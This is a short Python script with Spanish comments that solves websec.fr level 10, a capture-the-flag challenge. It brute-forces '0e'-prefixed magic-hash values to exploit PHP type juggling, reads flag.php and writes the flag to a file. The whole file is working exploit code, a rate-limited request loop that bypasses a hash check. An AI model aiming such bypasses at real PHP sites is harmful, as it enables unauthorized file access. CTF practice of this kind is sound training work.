#!/usr/bin/env python3
import requests
import time

url = "https://websec.fr/level10/index.php"

print("Probando SOLO hashes 0e... para type juggling")
print("="*60 + "\n")

# Generar todos los hashes 0e seguidos de 6 dígitos (1 millón de combinaciones)
# Formato: 0e000000 hasta 0e999999

tested = 0
for i in range(1000000):
    hash_val = f"0e{i:06d}"
    
    if tested % 10000 == 0:
        print(f"Probados: {tested:,} - Actual: {hash_val}")
    
    try:
        r = requests.get(url, params={"f": "flag.php", "hash": hash_val}, timeout=2)
        
        if "WEBSEC{" in r.text:
            flag_start = r.text.find("WEBSEC{")
            flag_end = r.text.find("}", flag_start)
            if flag_end > flag_start:
                flag = r.text[flag_start:flag_end+1]
                print(f"\n¡¡¡FLAG!!!: {flag}")
                print(f"Hash usado: {hash_val}")
                
                with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                    f.write(f"FLAG: {flag}\nHash: {hash_val}\n")
                
                exit(0)
    
    except:
        pass
    
    tested += 1
    
    if tested % 10 == 0:
        time.sleep(0.01)

print(f"\nCompletado: {tested:,} hashes probados")